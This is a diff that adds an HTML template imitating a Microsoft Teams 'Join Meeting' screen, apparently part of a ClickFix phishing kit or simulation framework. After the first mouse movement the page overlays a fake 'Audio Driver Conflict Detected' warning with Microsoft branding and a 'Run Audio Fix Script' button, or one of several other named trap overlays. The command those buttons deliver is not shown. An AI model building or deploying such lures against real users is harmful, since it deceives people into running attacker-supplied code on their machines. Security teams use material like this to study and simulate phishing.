@@ -1,0 +1,110 @@
+{% extends "base_layout.html" %}
+
+{% block title %}Microsoft Teams - Join Meeting{% endblock %}
+
+{% block content %}
+<!-- Decoy Layer: Looks like a normal meeting join screen -->
+<div id="decoy-layer" class="lure-container" style="background-color: #202020; color: white; display: flex; flex-direction: column; height: 100vh; width: 100vw; justify-content: center; align-items: center; font-family: 'Segoe UI', sans-serif; overflow: hidden; position: fixed; top: 0; left: 0;">
+    <div style="text-align: center; width: 100%; max-width: 800px; padding: 20px;">
+        <h1 style="margin-bottom: 20px; color: white; font-weight: 600; font-size: 28px;">Meeting with Project Team</h1>
+        <div style="width: 100%; aspect-ratio: 16/9; background-color: #111; margin: 0 auto 30px auto; display: flex; align-items: center; justify-content: center; border-radius: 8px; position: relative; box-shadow: 0 4px 12px rgba(0,0,0,0.3);">
+            <div style="width: 120px; height: 120px; border-radius: 50%; background-color: #5b5fc7; display: flex; align-items: center; justify-content: center; font-size: 2.5em; color: white; font-weight: 600;">
+                JS
+            </div>
+            <div style="position: absolute; bottom: 20px; left: 0; width: 100%; text-align: center; color: #fff; font-size: 14px; font-weight: 500;">
+                Video is off
+            </div>
+            <div style="position: absolute; top: 20px; right: 20px; display: flex; gap: 10px;">
+                <div style="background: rgba(0,0,0,0.6); padding: 8px; border-radius: 4px; cursor: pointer;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M3 5h18v14H3V5zm2 2v10h14V7H5zm0-2h14a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2z"/></svg>
+                </div>
+            </div>
+        </div>
+        
+        <div style="display: flex; justify-content: center; gap: 40px; margin-bottom: 40px; align-items: center;">
+             <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
+                 <div style="background: #292929; width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: background 0.2s;">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/><path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>
+                 </div>
+                 <span style="font-size: 12px; color: #ccc;">Mic is off</span>
+             </div>
+             <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
+                 <div style="background: #292929; width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: background 0.2s;">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M15 8v8H5V8h10m1-2H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4V7c0-.55-.45-1-1-1z"/></svg>
+                 </div>
+                 <span style="font-size: 12px; color: #ccc;">Camera is off</span>
+             </div>
+             <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
+                 <div style="background: #292929; width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: background 0.2s;">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58a.49.49 0 0 0 .12-.61l-1.92-3.32a.488.488 0 0 0-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54a.484.484 0 0 0-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58a.49.49 0 0 0-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+                 </div>
+                 <span style="font-size: 12px; color: #ccc;">Settings</span>
+             </div>
+        </div>
+
+        <div style="display: flex; justify-content: center; gap: 15px;">
+            <button style="background-color: #5b5fc7 !important; color: white !important; border: none !important; padding: 12px 60px; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: 600; transition: background 0.2s;" onmouseover="this.style.backgroundColor='#4f52b2'" onmouseout="this.style.backgroundColor='#5b5fc7'">Join now</button>
+            <button style="background-color: transparent !important; color: white !important; border: 1px solid #555 !important; padding: 12px 20px; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: 600; transition: background 0.2s;" onmouseover="this.style.backgroundColor='rgba(255,255,255,0.1)'" onmouseout="this.style.backgroundColor='transparent'">Cancel</button>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{# Define embedded attack layer - only shown if no external trap_type is set #}
+{% block attack_layer %}
+{% if not trap_type %}
+<!-- Attack Layer: The fake error (Hidden initially) -->
+<div id="attack-layer" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(4px); z-index: 900; justify-content: center; align-items: center;">
+    <div class="teams-card" style="position: relative; max-width: 450px; background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.2);">
+        <h1 style="color: #5b5fc7; margin-bottom: 15px; font-size: 1.5em;">Microsoft Teams</h1>
+        
+        <div style="text-align: left; margin-bottom: 20px;">
+            <h3 style="margin-bottom: 10px; color: #d93025; display: flex; align-items: center; gap: 10px;">
+                <span>⚠️</span> Audio Driver Conflict Detected
+            </h3>
+            <p style="color: #333; font-size: 0.95em; line-height: 1.5;">
+                Microsoft Teams has detected a critical conflict with your system audio drivers.
+                <strong>You will be unable to hear or speak in this meeting</strong> until the drivers are patched.
+            </p>
+        </div>
+
+        <button class="btn-fix" onclick="triggerClickFix()" style="width: 100%; background-color: #5b5fc7; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 16px; transition: background 0.2s;" onmouseover="this.style.backgroundColor='#4f52b2'" onmouseout="this.style.backgroundColor='#5b5fc7'">
+            Run Audio Fix Script
+        </button>
+        
+        <p style="margin-top: 15px; font-size: 0.8em; color: #888;">
+            Version 1.6.00.12455 (64-bit) | &copy; Microsoft Corporation
+        </p>
+    </div>
+</div>
+{% endif %}
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    let triggered = false;
+
+    // Function to trigger the lure - shows either embedded attack layer or external trap
+    function showLure() {
+        if (!triggered) {
+            triggered = true;
+            // Check for embedded attack layer first, then external trap overlays
+            const attackLayer = document.getElementById('attack-layer') ||
+                               document.getElementById('cf-overlay') ||
+                               document.getElementById('chrome-overlay') ||
+                               document.getElementById('wu-trigger-overlay') ||
+                               document.getElementById('filefix-overlay');
+            if (attackLayer) {
+                attackLayer.style.display = 'flex';
+            }
+        }
+    }
+
+    // Trigger on mouse movement (user engagement)
+    document.addEventListener('mousemove', function() {
+        if (!triggered) {
+            setTimeout(showLure, 800); // 800ms delay for realism
+        }
+    }, { once: true });
+</script>
+{% endblock %}
